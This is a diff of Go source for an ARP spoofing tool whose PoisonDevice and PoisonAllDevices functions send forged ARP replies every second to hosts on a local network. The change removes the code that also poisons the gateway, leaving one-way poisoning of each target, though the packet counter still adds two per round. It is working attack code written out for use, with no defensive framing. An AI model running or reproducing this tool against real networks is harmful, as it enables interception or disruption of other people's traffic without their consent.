@@ -158,15 +158,8 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 		return fmt.Errorf("failed to build ARP reply to target: %w", err)
 	}
 
-	// Poison 2: Tell gateway that target is at our MAC
-	poisonToGateway, err := buildARPReply(iface.HardwareAddr, targetIP, gatewayMAC, gatewayIP)
-	if err != nil {
-		return fmt.Errorf("failed to build ARP reply to gateway: %w", err)
-	}
-
 	// Wrap in Ethernet frames
 	frameToTarget := appendEthernet(targetMAC, iface.HardwareAddr, poisonToTarget)
-	frameToGateway := appendEthernet(gatewayMAC, iface.HardwareAddr, poisonToGateway)
 
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
@@ -191,11 +184,6 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 			// Send poison to target
 			if err := handle.WritePacketData(frameToTarget); err != nil {
 				fmt.Printf("[!] Error sending to target: %v\n", err)
-			}
-
-			// Send poison to gateway
-			if err := handle.WritePacketData(frameToGateway); err != nil {
-				fmt.Printf("[!] Error sending to gateway: %v\n", err)
 			}
 
 			packetCount += 2
@@ -232,7 +220,6 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 		ip            net.IP
 		mac           net.HardwareAddr
 		frameToTarget []byte
-		frameToGW     []byte
 	}
 
 	var targets []poisonTarget
@@ -250,17 +237,10 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 			continue
 		}
 
-		poisonToGW, err := buildARPReply(iface.HardwareAddr, host.IP, gatewayMAC, gatewayIP)
-		if err != nil {
-			fmt.Printf("[!] Error building poison for %s: %v\n", host.IP, err)
-			continue
-		}
-
 		targets = append(targets, poisonTarget{
 			ip:            host.IP,
 			mac:           host.MAC,
 			frameToTarget: appendEthernet(host.MAC, iface.HardwareAddr, poisonToTarget),
-			frameToGW:     appendEthernet(gatewayMAC, iface.HardwareAddr, poisonToGW),
 		})
 
 		fmt.Printf("[*] Added target: %s (%s)\n", host.IP, host.MAC)
@@ -295,11 +275,6 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 				// Poison target
 				if err := handle.WritePacketData(target.frameToTarget); err != nil {
 					fmt.Printf("[!] Error poisoning %s: %v\n", target.ip, err)
-				}
-
-				// Poison gateway about this target
-				if err := handle.WritePacketData(target.frameToGW); err != nil {
-					fmt.Printf("[!] Error poisoning gateway for %s: %v\n", target.ip, err)
 				}
 
 				packetCount += 2
